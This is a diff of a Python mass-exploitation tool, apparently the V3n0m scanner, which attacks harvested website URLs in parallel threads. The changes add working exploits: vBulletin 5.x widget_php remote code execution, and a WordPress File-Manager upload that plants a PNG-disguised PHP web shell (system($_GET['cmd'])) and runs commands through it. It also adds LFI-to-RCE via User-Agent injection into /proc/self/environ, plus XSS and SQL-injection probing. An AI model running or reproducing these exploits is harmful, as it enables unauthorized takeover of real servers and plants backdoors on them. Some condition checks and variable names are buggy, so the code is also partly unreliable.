@@ -1,5 +1,6 @@
 #!/usr/bin/python3
 # -*- coding: UTF-8 -*-
+
 try:
     import re, random, threading, socket, urllib.request, urllib.error, urllib.parse, http.cookiejar, subprocess, \
         time, sys, os, math, itertools, queue, asyncio, aiohttp, argparse, socks, httplib2, requests, zipfile
@@ -87,14 +88,13 @@ except Exception as verb:
         subprocess._cleanup()
     if chce == '3':
         exit()
-
-
 __name__ = '__main__'
+
 
 def donations():
     import time
     print(B + "\n---------------------------------------------------------")
-    print(":" + G + "Bitcoin Address:" + R +  "1DdfZzCFFFvRVkyVjG2ZPG7Udu6kMDh7Eb   " + B +" ")
+    print(":" + G + "Bitcoin Address:" + R + "1DdfZzCFFFvRVkyVjG2ZPG7Udu6kMDh7Eb   " + B + " ")
     print(":" + G + "Etherium Address:" + R + "0x28AeAC2046b39da6A4De06B590c5FE8B0e65e3f0" + B + " ")
     print(":" + O + "All donations help keep this project going!")
     print(B + "----------------------------------------------------------")
@@ -102,16 +102,18 @@ def donations():
     fmenu()
 
 
-
 def logo():
     cache_Check()
     sql_list_counter()
     lfi_list_counter()
+    rce_list_counter()
+    xss_list_counter()
+    misc_list_counter()
     print(R + "\n----------------------------------------------------------------")
     print(" Release Date JUL 31 2020    " + B + "        Author: NovaCygni       " + R + " ")
     print("        Proxy Enabled " + G + " [", ProxyEnabled, "] " + R + "                               ")
     print("        Cache & Log Status " + B + " [", cachestatus, "] " + R + "           ")
-    print(" " + O + "Please check the Misc Options for Donations Options, Thankyou " + R + "         ")
+    print(" " + O + "Please check the Misc Options for Donations Options, Thank you " + R + "         ")
     print(" " + O + "Donating helps keep this project alive and active. " + R + "         ")
     print("                    _____       _____                           ")
     print("          " + G + "         |____ |     |  _  |    " + R + "                      ")
@@ -121,63 +123,124 @@ def logo():
     print("    Official   \_/" + G + " \____/|_" + R + "| |_|" + G + "\___/|_| |_| " + R + "|_| Release",
           current_version, " \
 ")
-    print("  Harvested And Confirmed Vuln URLs in Database:" + O + " [", sql_count, "] " + R + "         ")
-    print("  Confirmed LFI Vulns In Database:" + O + " [", lfi_count, "] " + R + "                       ")
+    print(" Confirmed SQLI Vulns In Database:" + O + " [", sql_count, "] " + R + "         ")
+    print(" Confirmed LFI Vulns In Database:" + O + " [", lfi_count, "] " + R + "                       ")
+    print(" Confirmed XSS Vulns In Database:" + O + " [", xss_count, "] " + R + "                        ")
+    print(" Confirmed RCE Vulns In Database:" + O + "[", rce_count, "] " + R + "                         ")
+    print(" Confirmed MISC Vulns In Database:" + O + "[", misc_count, "] " + R + "                        ")
     print("----------------------------------------------------------------\n")
 
 
+def vb5classic(url):
+    url = url.rsplit(sites, 1)[0]
+    url = url + sites
+    params = {"routestring": "ajax/render/widget_php"}
+    cmd = "id"
+    params["widgetConfig[code]"] = "echo shell_exec('" + cmd + "'); exit;"
+    try:
+        r = requests.post(url=url, data=params, timeout=5)
+        if 'uid=' and 'gid' and 'groups=' in r.text:
+            print(R + url + " ====> Vbulletin 5.x vuln found")
+            vuln.append(url)
+            misc_log_file.write("\n" + url + " vBulletin Ver 5.x > 5.5.4 RCE")
+    except:
+        pass
+
+
+class vb5thread(threading.Thread):
+    def __init__(self, hosts):
+        self.hosts = hosts
+        self.fcount = 0
+        self.check = True
+        threading.Thread.__init__(self)
+
+    def run(self):
+        urls = list(self.hosts)
+        for url in urls:
+            try:
+                if self.check:
+                    vb5classic(url)
+                else:
+                    break
+            except(KeyboardInterrupt, ValueError):
+                pass
+        self.fcount += 1
+
+    def stop(self):
+        self.check = False
+
+
+def vb5test():
+    vb = len(usearch) / int(numthreads)
+    i = int(vb)
+    m = len(usearch) % int(numthreads)
+    z = 0
+    print("\n[+] Preparing for Vbulletin 5.x scanning ...")
+    print("[+] Can take a while and appear not to be doing anything...")
+    print("[!] Please be patient if you can see this message, its Working ...\n")
+    try:
+        if len(threads) <= int(numthreads):
+            for x in range(0, int(numthreads)):
+                sliced = usearch[x * i:(x + 1) * i]
+                if z < m:
+                    sliced.append(usearch[int(numthreads) * i + z])
+                    z += 1
+                thread = vb5thread(sliced)
+                thread.start()
+                threads.append(thread)
+            for thread in threads:
+                thread.join()
+    except TimeoutError:
+        pass
 
 
 def classicwpfm(url):
     url = url.rsplit(sites, 1)[0]
     url = url + sites
     burp0_url = "%s/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php" % url
-    burp0_headers = {"User-Agent": "curl/7.68.0", "Accept": "*/*", "Content-Type": "multipart/form-data; boundary=------------------------66e3ca93281c7050", "Expect": "100-continue", "Connection": "close"}
+    burp0_headers = {"User-Agent": "curl/7.68.0", "Accept": "*/*",
+                     "Content-Type": "multipart/form-data; boundary=------------------------66e3ca93281c7050",
+                     "Expect": "100-continue", "Connection": "close"}
     burp0_data = "--------------------------66e3ca93281c7050\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\nupload\r\n--------------------------66e3ca93281c7050\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\nl1_Lw\r\n--------------------------66e3ca93281c7050\r\nContent-Disposition: form-data; name=\"upload[]\"; filename=\"x.php\"\r\nContent-Type: image/png\r\n\r\n\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x01^\x00\x00\x01^\x04\x03\x00\x00\x00?\x05j)\x00\x00\x00\x1ePLTE\xff\xff\xff\xef\xef\xef\xe5\xe5\xe5\xce\xce\xce\xa1\xa1\xa1iiiVVVGGG333\x00\x00\x00g\x00\xcc\xe2\x00\x00\r\xc0IDATx\xda\xed]K[\xdb\xc8\x12m\xc9\xce^\xc6\x90\xbb58\t\xdc\x9dm\x9c\t\xd9\xd9X\x1e\xc2\x8e\x87I\xc22\t!\x93\xe5@xmc\x02\xf1\xda\x0f\xa9\xff\xed]`\xeb\xddVU\xc9C\xb5\xe6\xa2-\xd4\xa7\xf2Q\xe9\xa8\x1fuN\x8b\xdf\xb9\xba\xee\x84\xbc\"^\xd7\x83\xc7\x8f\xbc\x9a\x08\xa7\xb1F\xbb\xaa\x97\xf4\xc8:5\xf2^L,A\xbb\x8cSr\xe4\x055\xd2\xbc\x17\x0eC\xbe\xe4H\xf3NL*\x8f\x8f\xd2i\xbe\xf05Y\xf05\xffM\xf5[*\x95J\xb9\xc1\xb7\xdc\xb4\x8f\xde\x9f\x1e\xf5\xec\x86\x95\x83\xfa\xadv\xff\x92\xd3\xcb\xfd\xba]\xd1\x86\x1f\x92Q2\xeck\x19\xb8\xdc\x93FB\xa4>\xf5[\xde\x91\x91k\xd2\xd1\x18\xdf\xeaG\x19\xbb\xdcCK\xd7\xfa-\x97\x12\x90\xb0.\xfcP>\x9629a-\xf9\xd7\xdc\x95\x8a\xcb\xdd\xd6\x11\xdf\x1d\xa9\xbc&5\xfd\xea\xf7\xe5@\x9d\xaf\xbc\xad\xe8\xc6\x0f\x85c9\xef:\xd0\x8c\x8d\x9d\xb9\xe9J\xa7\xa6\x17\xbe\xcb\x83\xf9\xf9\xca[\xad\xea\xd7\xd8MIW\xba-\x9d\xf8\xe1\x85L\xbdn-}\xf87\x1d^)eK\x1f|\x97\x01\xe9\xfa\x15\xcc_\xbf\x10x\xa5[\xd3\x85\x1f\n\x03H\xbe\xf2\\\x17\xfe}\x03JW\x8e+z\xe0k\x1c\xc3\xf2\x95m=\xea\xb7\x08LW\x8e\xf4\xe0\x87-h\xbe\xd3{1\xf3\xaf\t-\x07)\xf7t\xc0\x17\\\x0eR\xf6u\xa8\xdfux\xbe\x0f\x8b\xb7\xbc\xfc\x00\xfa\x16\x87\xbe\xc9\xbc\xfc\x0b\xfcX<\\\x9f\xf8\xf1E\x94\xef\x94\xd1x\xeb\xf7\r&\xdf\xb1\xc5\xce\x0f\x98\xf2\x95\xb2\xc6\xcd\xbf\xc6wT\xbe\xfb\xdc\xf8\x16P\xe9\xca\x9f\xdc\xf5\xbb\x8c\xcbw\xc4\xcd\x0f\x1b\xb8|\xc7\x163\xff\xbe\xc5\xe5\xeb\xd6x\xf15p\xf4 e\x8b\xb7~\x91\xf4 e\x9b\x97\x1f\xcc\x012\xdf\xbfy\xf9\x17IgR\xf6y\xf1]\xc6\xe6;\xe4\xad\xdfg\xd8|G\x16+?\xac`\xf3\x1d\xf3\xf2\xef::_^|\xb7\xb0\xf9:\x16k\xfd\xbe\xc5\xe6\xebV\xb2\xf0Yf|\xf1\xf9\xd6X\xf1\xc5~\x8e\xa5\xcc\x19\xbe2o\xf8\xd6\x84q\xc9\x87/%_\xf3k\x8e\xf8![=<>\xbe\xcc\xfc@\xe13\xce\xef\x1b\xe5{\xc1\x89\xef\x066\xdf\t/\xffR\xc6;\x9c\xf8\xaeP\xc6\xbf\x8c\xf8\xe2\xc7\xeb\xbc\xf3\x8b\"z>\xc4\x8b\xef#\xcf73\xe3\x8b\x9e\xcf\x12\xac\xf8\x1a\xc7\xc8|\x99\xd7w\x04a=\x8a\x13_\xf4z_\x85\x19\xdfW\xf8\xf5T\xce\xf1/e\xbd\x9as\xfc\x8b%\xb43\xc1\x8c/\x92 \xf6\xd8\xf7\xe7\xf1\xfbY\xbc\xfbo\xaf\xb0\xaf\x1b\xf3\xfe&j\x041\x14\xec\xfb\xc7\xe6\r\"\xdf\x03\xc1\xdf\x1f\xb5\x8b,_\xee\xfe(D\x01?tt1\xf7\x97<f?\xccB\xfa\xa3\x8e1\x83\x1d\r\xfaS\xd7\x11sc\x1d\xf0-\xe2\xca\x81\xbd\xbf\x0f\xbc'\xdb\x8eF\xf2\xe0+\xfe\xc0\xf5{\xb2\xf7\xa7\x16`\x9f\x8c\xcfB\x13|\xc5;\xd0\xcePM\xe8Q\xbfB\x14\x07\xf0\xb7M\x0b}\x00\xe0\x8ds\xeb\xde/\xe5\xd7\xb7,\xa7\x03|+4\xc2\xd7H\xad`\xb7\xb6\x88|\x17\xa6\x1fJ\xad\xe0sK\x11\xc9\x82o*\x07\x8f\x03z'-\xf4\xb1)z\xb2mu$\x0f\xbe\xf3_\xb9\x1f\xd6\x9cH\x16|\x85x\x9d\xfe%\xd6\x86\x1f\x84\x10\xc2Tr\xc4\xa4\x1d\xfe\xa5\x9a\xe8\xbb\x0b\xef@\xf2X}\xfc\t\xca\x1f\x93\xd3]\x9c^z\xc1\xfa\xf9$\x84\x9d\x8e\x05\x88d\xc1W\x88\xa5n\x94%~m\xc7#5\xf2\xd70\x9a\xa1\x9apz\x15h$\x0b\xbeB\x88B\xf3\xc3\x0c\xe3\xbb^\x03\x13\xc9\x81\xaf\x10B\x946\xedn\xf7\xa8kw\xd6p\xbf\x94\x07\xdfi\xceB\xfd\xd7\xbc\xf9\x1b\xe5\xcd'o\xfeFF\xde\xf0\xfd\xf2\xe7rVK\xb4k\xe9\xb4B\x8d\xbc\xa4\xde\xb3p/\xdc\xafG\xb4\xeb\xfd\xe0\xe8\xf1#'B\xdeS\xbd\xf4\xe45\xd5\xbf\xcf\xa5\xde\xf3\xda\x11\x0e\xd9K\xef\x94\x1c\xf9m\x8d\x1ay\x97\xb3\xf7\xed>\x83\x1f\xde\xd3\xf7\xed\xe9\xfb\xf6\xf4}\x8b\xfcimssss\xcd\xcaE\xfd\x1ae\xfb\xfd\xf5@J\xf7\xfe\xc8n\xe8?\xfe-\x07\xad\xf4\xeez\xab\xda\xe0\x9b<\xbfhF\x16/~u,\x8d\xf15^\x0f\xe26o\x15m\xeb\xd7\xf83ie(\xb6\x18\xa0\x0b?$\xa7+e\xcf\xd2\x92\r\xe5Rl\xc4\xaaP\x13|\xd5\xd6t\xee\xbe\x86\xf5[\x9c\xb3\x9d\xeb\xd4\xb5\xe3\x07s\xeef\xe3\xa8\xa2\x1b\xff\xbe\x9e\xbf\xb3t\xa8\x19\xbei\x9b\xfbA/H\x1d\xea\xf7\x1d|#W\x07~H\xdf\xda\x0f:\xff\xf1\xf3/\xa0u\xe2V#|!\x9d\x13>\xc0\xfc\xf5\xfbN\xa2:=\xb8\xf9\x01\xd6\xf9\xe3\xf5\"\xb0\xf3/\xb0\xf7\xf2\xb3&\xf8B\x9b\xc9\xc7\x96\x1e\xf5\x0b\xee\x0cl\xe9<?php system($_GET[\"cmd\"]); ?>\r\n--------------------------66e3ca93281c7050--\r\n"
     try:
-        requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
+        requests.post(burp0_url, headers=burp0_headers, data=burp0_data, timeout=2)
     except:
         pass
-    print("Testing " + url)
     cmd = "echo shell_exec('id')"
     burp0_url = "%s/wp-content/plugins/wp-file-manager/lib/files/x.php?cmd=%s" % (url, cmd)
     burp0_headers = {"User-Agent": "curl/7.68.0", "Accept": "*/*", "Expect": "100-continue", "Connection": "close"}
     try:
-        r = requests.get(burp0_url, headers=burp0_headers)
+        r = requests.get(burp0_url, headers=burp0_headers, timeout=5)
+        if 'uid=' and 'gid=' and 'groups=' in r.text:
+            print(R + url + " Vuln Found =====> WordPress File-Manager ")
+            misc_log_file.write("\n" + url + "==> Wordpress File-Manager ")
+            vuln.append(url)
+
     except:
-        r = str("V3n0m")
-    if  'uid=' and 'gid=' and 'groups=' in r.text:
-        print( url + " Vuln Found =====> WordPress File-Manager ")
-        misc_log_file.write("\n" + url + "==> Wordpress File-Manager ")
-        vuln.append(url)
-        
-    else:
         pass
 
 
-
-
 class wpfmthread(threading.Thread):
-	def __init__(self, hosts):
-		self.hosts = hosts
-		self.fcount = 0
-		self.check = True
-		threading.Thread.__init__(self)
+    def __init__(self, hosts):
+        self.hosts = hosts
+        self.fcount = 0
+        self.check = True
+        threading.Thread.__init__(self)
 
-	def run(self):
-		urls = list(self.hosts)
-		for url in urls:
-			try:
-				if self.check:
-					classicwpfm(url)
-				else:
-					break
-			except(KeyboardInterrupt, ValueError):
-				pass
-		self.fcount += 1
+    def run(self):
+        urls = list(self.hosts)
+        for url in urls:
+            try:
+                if self.check:
+                    classicwpfm(url)
+                else:
+                    break
+            except(KeyboardInterrupt, ValueError):
+                pass
+        self.fcount += 1
 
-	def stop(self):
-		self.check = False
+    def stop(self):
+        self.check = False
 
 
 def wpfmtest():
@@ -205,37 +268,38 @@ def wpfmtest():
 
 
 def vb56(url, shell_cmd):
-    post_data = {'subWidgets[0][template]' : 'widget_php', 'subWidgets[0][config][code]' : "echo shell_exec('%s'); exit;" % shell_cmd}
     try:
-        r = requests.post('%s/ajax/render/widget_tabbedcontainer_tab_panel' % url, post_data)
+        post_data = {'subWidgets[0][template]': 'widget_php',
+                     'subWidgets[0][config][code]': "echo shell_exec('%s'); exit;" % shell_cmd}
+        r = requests.post('%s/ajax/render/widget_tabbedcontainer_tab_panel' % url, post_data, timeout=5)
     except:
         pass
     return r.text
 
+
 class vb56thread(threading.Thread):
-	def __init__(self, hosts):
-		self.hosts = hosts
-		self.fcount = 0
-		self.check = True
-		threading.Thread.__init__(self)
+    def __init__(self, hosts):
+        self.hosts = hosts
+        self.fcount = 0
+        self.check = True
+        threading.Thread.__init__(self)
 
-	def run(self):
-		urls = list(self.hosts)
-		for url in urls:
-			try:
-				if self.check:
-					classicvb56(url)
-				else:
-					break
-			except(KeyboardInterrupt, ValueError):
-				pass
-		self.fcount += 1
+    def run(self):
+        urls = list(self.hosts)
+        for url in urls:
+            try:
+                if self.check:
+                    classicvb56(url)
+                else:
+                    break
+            except(KeyboardInterrupt, ValueError):
+                pass
+        self.fcount += 1
 
-	def stop(self):
-		self.check = False
+    def stop(self):
+        self.check = False
 
 
-		
 def vb56test():
     log = "v3n0m-lfi.txt"
     logfile = open(log, "a", encoding='utf-8')
@@ -262,50 +326,46 @@ def vb56test():
         pass
 
 
-
-
 def classicvb56(url):
     url = url.rsplit(sites, 1)[0]
     url = url + sites
+    post_data = {'subWidgets[0][template]': 'widget_php', 'subWidgets[0][config][code]': "echo shell_exec('id'); exit;"}
     try:
-        cmd =  'id'
-        vuln = vb56(url, cmd)
-        if  'uid=' and 'gid=' and 'groups=' in vuln:
-            print( url + ' =====> Vuln Found ===> vBulletin Ver 5.5.4 > 5.6.2 RCE ')
+        r = requests.post('%s/ajax/render/widget_tabbedcontainer_tab_panel' % url, post_data, timeout=5)
+        if 'uid=' and 'gid=' and 'groups=' in r.text:
+            print(R + url + ' =====> Vuln Found ===> vBulletin Ver 5.5.4 > 5.6.2 RCE ')
             vuln.append(url)
-            misc_log_file.write("\n" + url + " vBulletin Ver 5.5.4 > 5.6.2 RCE" )
+            misc_log_file.write("\n" + url + " vBulletin Ver 5.5.4 > 5.6.2 RCE")
     except:
         pass
 
 
-
 class Lfithread(threading.Thread):
-	def __init__(self, hosts):
-		self.hosts = hosts
-		self.fcount = 0
-		self.check = True
-		threading.Thread.__init__(self)
+    def __init__(self, hosts):
+        self.hosts = hosts
+        self.fcount = 0
+        self.check = True
+        threading.Thread.__init__(self)
 
-	def run(self):
-		urls = list(self.hosts)
-		for url in urls:
-			try:
-				if self.check:
-					classiclfi(url)
-				else:
-					break
-			except(KeyboardInterrupt, ValueError):
-				pass
-		self.fcount += 1
+    def run(self):
+        urls = list(self.hosts)
+        for url in urls:
+            try:
+                if self.check:
+                    classiclfi(url)
+                else:
+                    break
+            except(KeyboardInterrupt, ValueError):
+                pass
+        self.fcount += 1
 
-	def stop(self):
-		self.check = False
-
-
-
+    def stop(self):
+        self.check = False
 
 
 def classiclfi(url):
+    lfi_log_file = open("v3n0m-lfi.txt", "a", encoding='utf-8')
+    rce_log_file = open("v3n0m-rce.txt", "a", encoding='utf-8')
     try:
         for lfi in lfis:
             try:
@@ -315,28 +375,28 @@ def classiclfi(url):
                 hits = str(resp.read())
             except:
                 resp = str('v3n0m')
-            print('Testing: ' + url + lfi)
             if str("root:x") in hits and url not in vuln:
-                print( R + ' [LFI] ' + O + url + lfi + R + "====>" 'LFI Found')
+                print(R + ' [LFI] ' + O + url + lfi + R + "====>" 'LFI Found')
                 vuln.append(url)
                 lfi_log_file.write("\n" + url)
                 target = url + lfi
                 target = target.replace(lfi, "/proc/self/environ")
                 header = "<? echo md5(NovaCygni); ?>"
                 try:
-                    head = {'User-Agent' : header}
-                    request_web = urllib.request.Request(target,headers=head)
-                    text = urllib.request.urlopen(request_web)
+                    head = {'User-Agent': header}
+                    request_web = urllib.request.Request(target, headers=head, timeout=5)
+                    text = urllib.request.urlopen(request_web, timeout=5)
                     text = text.read()
                     if str("7ca328e93601c940f87d01df2bbd1972") in text:
-                        print(R + '[LFI >RCE]' + O + target  + R + "-----> LFI to RCE Found")
+                        print(R + '[LFI >RCE]' + O + target + R + "-----> LFI to RCE Found")
                         vuln.append(url)
                         rce_log_file.write("\n" + url)
                 except:
                     pass
     except:
         pass
-    
+
+
 def lfitest():
     log = "v3n0m-lfi.txt"
     logfile = open(log, "a", encoding='utf-8')
@@ -363,11 +423,8 @@ def lfitest():
         pass
 
 
-
 def killpid():
     os.kill(os.getpid(), 9)
-
-
 
 
 class Injthread(threading.Thread):
@@ -393,9 +450,6 @@ class Injthread(threading.Thread):
         self.check = False
 
 
-
-
-
 class xssthread(threading.Thread):
     def __init__(self, hosts):
         self.hosts = hosts
@@ -419,17 +473,16 @@ class xssthread(threading.Thread):
         self.check = False
 
 
-
 # noinspection PyBroadException
 def classicxss(url):
+    xss_log_file = open("v3n0m-xss.txt", "a", encoding='utf-8')
     for xss in xsses:
         try:
-            source = urllib.request.urlopen(url + xss.replace("\n", ""))
+            source = urllib.request.urlopen(url + xss.replace("\n", ""), timeout=5)
             hits = str(source.read())
         except:
             hits = str("v3n0m")
-        print(B + "Testing " + O + url)
-        if re.findall("<OY1Py",hits):
+        if re.findall("<OY1Py", hits):
             print(R + "\r\x1b[K[XSS]: ", O + url + xss, R + " ---> XSS Found")
             xss_log_file.write("\n" + url)
             vuln.append(url)
@@ -437,6 +490,7 @@ def classicxss(url):
             print(R + "\r\x1b[K[XSS]: ", O + url + xss, R + " ---> XSS Found")
             xss_log_file.write("\n" + url)
             vuln.append(url)
+
 
 # noinspection PyBroadException
 def xsstest():
@@ -460,16 +514,15 @@ def xsstest():
             thread.join()
 
 
-customSelected = False
 # Apoligies for this ugly section of code
 # It is just a placeholder
 # So dont worry, itll be replaced soon enough
 # noinspection PyBroadException
 def classicinj(url):
+    sql_log_file = open("v3n0m-sqli.txt", "r+", encoding='utf-8')
     aug_url = url + "'"
     global sql_list_counter
     global sql_list_count
-    open("sqli_confirmed", "r+", encoding='utf-8')
     try:
         try:
             resp = urllib.request.urlopen(aug_url, timeout=2)
@@ -478,167 +531,126 @@ def classicinj(url):
         hits = str(resp.read())
         if str("error in your SQL syntax") in hits:
             print(url + " is vulnerable --> MySQL Classic")
-            logfile.write("\n" + aug_url)
             vuln.append(hits)
             col.append(hits)
             sql_list_count += 1
             sql_log_file.write("\n" + aug_url)
-            pass
         elif str("mysql_fetch") in hits:
             print(url + " is Vulnerable --> MiscError")
-            logfile.write("\n" + aug_url)
             vuln.append(hits)
             col.append(hits)
             sql_list_count += 1
             sql_log_file.write("\n" + aug_url)
-            pass
         elif str("num_rows") in hits:
             print(url + " is Vulnerable --> MiscError2")
-            logfile.write("\n" + aug_url)
             vuln.append(hits)
             col.append(hits)
             sql_list_count += 1
             sql_log_file.write("\n" + aug_url)
-            pass
         elif str("ORA-01756") in hits:
             print(url + " is Vulnerable --> Oracle")
-            logfile.write("\n" + aug_url)
             vuln.append(hits)
             col.append(hits)
             sql_list_count += 1
             sql_log_file.write("\n" + aug_url)
-            pass
         elif str("Error Executing Database Query") in hits:
             print(url + " is Vulnerable --> JDBC_CFM")
-            logfile.write("\n" + aug_url)
             vuln.append(hits)
             col.append(hits)
             sql_list_count += 1
             sql_log_file.write("\n" + aug_url)
-            pass
         elif str("SQLServer JDBC Driver") in hits:
             print(url + " is Vulnerable --> JDBC_CFM2")
-            logfile.write("\n" + aug_url)
             vuln.append(hits)
             col.append(hits)
             sql_list_count += 1
             sql_log_file.write("\n" + aug_url)
-            pass
         elif str("OLE DB Provider for SQL Server") in hits:
             print(url + " is Vulnerable --> MSSQL_OLEdb")
-            logfile.write("\n" + aug_url)
             vuln.append(hits)
             col.append(hits)
             sql_list_count += 1
             sql_log_file.write("\n" + aug_url)
-            pass
         elif str("Unclosed quotation mark") in hits:
             print(url + " is Vulnerabe --> MSSQL_Uqm")
-            logfile.write("\n" + aug_url)
             vuln.append(hits)
             col.append(hits)
             sql_list_count += 1
             sql_log_file.write("\n" + aug_url)
-            pass
         elif str("ODBC Microsoft Access Driver") in hits:
             print(url + " is Vulnerable --> MS-Access_ODBC")
-            logfile.write("\n" + aug_url)
             vuln.append(hits)
             col.append(hits)
             sql_list_count += 1
             sql_log_file.write("\n" + aug_url)
-            pass
         elif str("Microsoft JET Database") in hits:
             print(url + " is Vulnerable --> MS-Access_JETdb")
-            logfile.write("\n" + aug_url)
             vuln.append(hits)
             col.append(hits)
             sql_list_count += 1
             sql_log_file.write("\n" + aug_url)
-            pass
         elif str("Error Occurred While Processing Request") in hits:
             print(url + " is Vulnerable --> Processing Request")
-            logfile.write("\n" + aug_url)
             vuln.append(hits)
             col.append(hits)
             sql_list_count += 1
             sql_log_file.write("\n" + aug_url)
-            pass
         elif str("Microsoft JET Database") in hits:
             print(url + " is Vulnerable --> MS-Access JetDb")
-            logfile.write("\n" + aug_url)
             vuln.append(hits)
             col.append(hits)
             sql_list_count += 1
             sql_log_file.write("\n" + aug_url)
-            pass
         elif str("Error Occurred While Processing Request") in hits:
             print(url + " is Vulnerable --> Processing Request ")
-            logfile.write("\n" + aug_url)
             vuln.append(hits)
             col.append(hits)
             sql_list_count += 1
             sql_log_file.write("\n" + aug_url)
-            pass
         elif str("Server Error") in hits:
             print(url + " is Vulnerable --> Server Error")
-            logfile.write("\n" + aug_url)
             vuln.append(hits)
             col.append(hits)
             sql_list_count += 1
             sql_log_file.write("\n" + aug_url)
-            pass
         elif str("ODBC Drivers error") in hits:
             print(url + " is Vulnerable --> ODBC Drivers error")
-            logfile.write("\n" + aug_url)
             vuln.append(hits)
             col.append(hits)
             sql_list_count += 1
             sql_log_file.write("\n" + aug_url)
-            pass
         elif str("Invalid Querystring") in hits:
             print(url + " is Vulnerable --> Invalid Querystring")
-            logfile.write("\n" + aug_url)
             vuln.append(hits)
             col.append(hits)
             sql_list_count += 1
             sql_log_file.write("\n" + aug_url)
-            pass
         elif str("OLE DB Provider for ODBC") in hits:
             print(url + " is Vulnerable --> OLE DB Provider for ODBC")
-            logfile.write("\n" + aug_url)
             vuln.append(hits)
             col.append(hits)
             sql_list_count += 1
             sql_log_file.write("\n" + aug_url)
-            pass
         elif str("VBScript Runtime") in hits:
             print(url + " is Vulnerable --> VBScript Runtime")
-            logfile.write("\n" + aug_url)
             vuln.append(hits)
             col.append(hits)
             sql_list_count += 1
             sql_log_file.write("\n" + aug_url)
-            pass
         elif str("ADODB.Field") in hits:
             print(url + " is Vulnerable --> ADODB.Field")
-            logfile.write("\n" + aug_url)
             vuln.append(hits)
             col.append(hits)
             sql_list_count += 1
             sql_log_file.write("\n" + aug_url)
-            pass
         elif str("BOF or EOF") in hits:
             print(url + " is Vulnerable --> BOF or EOF")
-            logfile.write("\n" + aug_url)
             vuln.append(hits)
             col.append(hits)
             sql_list_count += 1
             sql_log_file.write("\n" + aug_url)
-            pass
         elif str("ADODB.Command") in hits:
             print(url + " is Vulnerable --> ADODB.Command")
-            logfile.write("\n" + aug_url)
             vuln.append(hits)
             col.append(hits)
             sql_list_count += 1
@@ -646,60 +658,46 @@ def classicinj(url):
             pass
         elif str("JET Database") in hits:
             print(url + " is Vulnerable --> JET Database")
-            logfile.write("\n" + aug_url)
             vuln.append(hits)
             col.append(hits)
             sql_list_count += 1
             sql_log_file.write("\n" + aug_url)
-            pass
         elif str("mysql_fetch_array") in hits:
             print(url + " is Vulnerabe --> mysql_fetch_array")
-            logfile.write("\n" + aug_url)
             vuln.append(hits)
             col.append(hits)
             sql_list_count += 1
             sq_log_file.write("\n" + aug_url)
-            pass
         elif str("Syntax error") in hits:
             print(url + " is Vulnerable --> Syntax error")
-            logfile.write("\n" + aug_url)
             vuln.append(hits)
             col.append(hits)
             sql_list_count += 1
-            sql_log_filewrite("\n" + aug_url)
-            pass
+            sql_log_file.write("\n" + aug_url)
         elif str("mysql_numrows()") in hits:
             print(url + " is Vulnerable --> mysql_numrows()")
-            logfile.write("\n" + aug_url)
             vuln.append(hits)
             col.append(hits)
             sql_list_count += 1
             sql_log_file.write("\n" + aug_url)
-            pass
         elif str("GetArray()") in hits:
             print(url + " is Vulnerable --> GetArray()")
-            logfile.write("\n" + aug_url)
             vuln.append(hits)
             col.append(hits)
             sql_list_count += 1
             sql_log_file.write("\n" + aug_url)
-            pass
         elif str("FetchRow()") in hits:
             print(url + " is Vulnerable --> FetchRow()")
-            logfile.write("\n" + aug_url)
             vuln.append(hits)
             col.append(hits)
             sql_list_count += 1
             sql_log_file.write("\n" + aug_url)
-            pass
         elif str("Input string was not in a correct format") in hits:
             print(url + " is Vulnerable --> Input String Error")
-            logfile.write("\n" + aug_url)
             vuln.append(hits)
             col.append(hits)
             sql_list_count += 1
             sql_log_file.write("\n" + aug_url)
-            pass
         else:
             pass
     except:
@@ -724,136 +722,27 @@ def injtest():
     global sql_list_count
     global sqli_confirmed
     pulse = datetime.now()
-    holder = "sqli_confirmed"
-    sqli_confirmed = open(os.path.realpath(holder), "a")
-    if not customSelected:
-        log = "v3n0m-sqli.txt"
-        logfile = open(log, "a", encoding='utf-8')
-        vb = len(usearch) / int(numthreads)
-        i = int(vb)
-        m = len(usearch) % int(numthreads)
-        z = 0
-        print(B + "\n[+] Preparing for SQLi scanning ...")
-        print("[+] Can take a while and appear not to be doing anything...")
-        print("[!] Please be patient if you can see this message, its Working ...\n")
-        try:
-            if len(threads) <= int(numthreads):
-                for x in range(0, int(numthreads)):
-                    sliced = usearch[x * i:(x + 1) * i]
-                    if z < m:
-                        sliced.append(usearch[int(numthreads) * i + z])
-                        z += 1
-                    thread = Injthread(sliced)
-                    thread.start()
-                    threads.append(thread)
-                for thread in threads:
-                    thread.join()
-        except TimeoutError:
-            pass
-    else:
-        try:
-            log = input('Enter file name and location: ')
-            with open(log, encoding='utf-8') as hodor:
-                for line in hodor:
-                    hold_door = str(line.rstrip())+"'"
-                    hold_the_door = line.rstrip()
-                    try:
-                        resp = urllib.request.urlopen(hold_door, timeout=2)
-                        hits = str(resp.read())
-                    except: # In event of Exception throw pointless str so scan at least just continues.
-                        hits = '0'
-                    if str("error in your SQL syntax") in hits:
-                        print(hold_the_door + " is vulnerable --> MySQL Classic")
-                        sqli_confirmed.write("\n" + hold_the_door)
-                    if str("mysql_fetch") in hits:
-                        print(hold_the_door + " is Vulnerable --> MiscError")
-                        sqli_confirmed.write("\n" + hold_the_door)
-                    if str("num_rows") in hits:
-                        print(hold_the_door + " is Vulnerable --> MiscError2")
-                        sqli_confirmed.write("\n" + hold_the_door)
-                    if str("ORA-01756") in hits:
-                        print(hold_the_door + " is Vulnerable --> Oracle")
-                        sqli_confirmed.write("\n" + hold_the_door)
-                    if str("Error Executing Database Query") in hits:
-                        print(hold_the_door + " is Vulnerable --> JDBC_CFM")
-                        sqli_confirmed.write("\n" + hold_the_door)
-                    if str("SQLServer JDBC Driver") in hits:
-                        print(hold_the_door + " is Vulnerable --> JDBC_CFM2")
-                        sqli_confirmed.write("\n" + hold_the_door)
-                    if str("OLE DB Provider for SQL Server") in hits:
-                        print(hold_the_door + " is Vulnerable --> MSSQL_OLEdb")
-                        sqli_confirmed.write("\n" + hold_the_door)
-                    if str("Unclosed quotation mark") in hits:
-                        print(hold_the_door + " is Vulnerabe --> MSSQL_Uqm")
-                        sqli_confirmed.write("\n" + hold_the_door)
-                    if str("ODBC Microsoft Access Driver") in hits:
-                        print(hold_the_door + " is Vulnerable --> MS-Access_ODBC")
